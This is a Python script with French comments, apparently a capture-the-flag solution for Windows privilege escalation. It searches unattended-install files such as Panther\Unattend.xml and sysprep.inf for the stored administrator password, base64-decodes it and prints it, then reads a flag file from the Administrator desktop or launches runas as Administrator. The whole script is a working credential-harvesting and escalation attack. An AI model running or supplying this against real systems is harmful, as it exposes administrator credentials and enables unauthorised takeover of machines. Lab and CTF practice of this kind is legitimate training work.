import os
import re
import base64
import subprocess
from pathlib import Path

# Emplacements possibles des fichiers d'installation non surveillés
file_paths = [
    "C:\\Windows\\Panther\\Unattend.xml",
    "C:\\Windows\\Panther\\autounattend.xml",
    "C:\\Windows\\System32\\sysprep\\sysprep.inf",
]

# Fonction pour rechercher et extraire le mot de passe admin
def extract_admin_password(file_path):
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as file:
            content = file.read()
            match = re.search(r"<AdministratorPassword>.*?<Value>(.*?)</Value>", content, re.DOTALL)
            if match:
                return match.group(1).strip()
    except Exception as e:
        print(f" Erreur lors de la lecture de {file_path}: {e}")
    return None

# Vérifie tous les emplacements et extrait les credentials
admin_password = None
for path in file_paths:
    if os.path.exists(path):
        print(f" Fichier trouvé: {path}")
        admin_password = extract_admin_password(path)
        if admin_password:
            print(f" Mot de passe trouvé: {admin_password}")
            break

if not admin_password:
    print("Aucun mot de passe administrateur trouvé.")
    exit(1)

# Décodage si le mot de passe est encodé en Base64
try:
    decoded_password = base64.b64decode(admin_password).decode("utf-8")
    print(f" Mot de passe décodé: {decoded_password}")
except:
    decoded_password = admin_password  # Si le mot de passe n'est pas encodé

# Accès au bureau de l'administrateur et récupération du flag
admin_desktop = Path("C:\\Users\\Administrator\\Desktop\\flag.txt")

if admin_desktop.exists():
    print(f" Flag trouvé sur le bureau de l'administrateur: {admin_desktop}")
    with open(admin_desktop, "r") as flag_file:
        flag = flag_file.read()
        print(f" FLAG: {flag}")
else:
    print(" Impossible d'accéder au fichier flag.txt. Tentative d'ouverture de session...")

    # Lancement d'un shell admin avec `runas`
    subprocess.run(f'runas /user:Administrator "notepad {admin_desktop}"', shell=True)
